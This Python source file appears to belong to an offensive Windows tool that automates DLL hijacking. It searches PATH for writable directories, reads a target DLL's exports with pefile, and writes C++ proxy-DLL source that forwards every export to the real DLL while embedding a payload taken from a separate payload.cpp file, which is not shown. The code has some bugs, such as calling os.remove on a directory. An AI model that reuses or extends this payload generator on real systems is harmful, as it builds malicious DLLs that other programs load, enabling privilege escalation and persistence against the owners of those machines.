import os
import pefile
from Analyse import Technics



class GenPayloads(object):
    
    def __init__(self,path=True):
        if path:
            path = self.__genTemp__()
        self.path = path
        self.payloadcon = self.__getcpppayload__()
        
    def __getcpppayload__(self):
        return open(os.path.join(os.getcwd(),"dllpayload","payload.cpp"),'r').read()
        
    def findaccesspathenv(self):
        return [i for i in os.environ["path"].split(";") if Technics(None,True).isPermited(i)]
        
    def __genTemp__(self):
        if not os.path.isdir(
            os.path.join(os.path.join(os.getcwd(),"Paylodas"))
        ):
            os.mkdir(os.path.join(os.getcwd(),"Paylodas"))
        else:
            os.remove(os.path.join(os.getcwd(),"Paylodas"))
            return GenPayloads("").__genTemp__()
        return os.path.join(os.getcwd(),"Paylodas")
    
    
    def __getDll__(self,path):
        global TESTEDLL
        try:
            TESTEDLL
        except: TESTEDLL = {}
        if os.path.isfile(path):
            TESTEDLL[path] = path
        name = os.path.split(os.path.splitext(path)[0])[-1]
        if not name in list(TESTEDLL.keys()): 
            for i in os.environ["path"].split(";"):
                TESTEDLL[name] = False
                if os.path.isdir(i):
                    for n in os.listdir(i):
                        if name in n or name.lower() in n:
                            TESTEDLL[name] = os.path.join(i,n)
                            return TESTEDLL[name]
        return TESTEDLL[name]
    
    
    def __getDllFunc__(self,path):
        path = self.__getDll__(path)
        if path:
            if not (path[-4:]in [".DLL",'.dll']):
                return False
            return '\n'.join(
                [
                    f'#pragma comment(linker,"/export:{i.name.decode()}={path[:-4]}.{i.name.decode()},@{i.ordinal}")'
                    for i in pefile.PE(path).DIRECTORY_ENTRY_EXPORT.symbols if i.name != None
                ]
            ).replace('\\','\\\\')
        return False
        
    
    def generate(self,tech,name,process):
        technics = [i.strip() for i in tech.split(',')]
        if "Dll hijacking proxing" in technics:
            payload = self.__getDllFunc__(name)
            if not payload:
                payload = self.payloadcon
            else:
                payload = payload + "\n"*3 + self.payloadcon
        else:
            payload = self.payloadcon
        if not os.path.isdir(os.path.join(self.path,os.path.splitext(process)[0])):
            os.mkdir(os.path.join(self.path,os.path.splitext(process)[0]))
        open(os.path.join(self.path,os.path.splitext(process)[0],
                          os.path.split(os.path.splitext(name)[0])[-1]+'.cpp'),"w").write(payload)
        
        
        
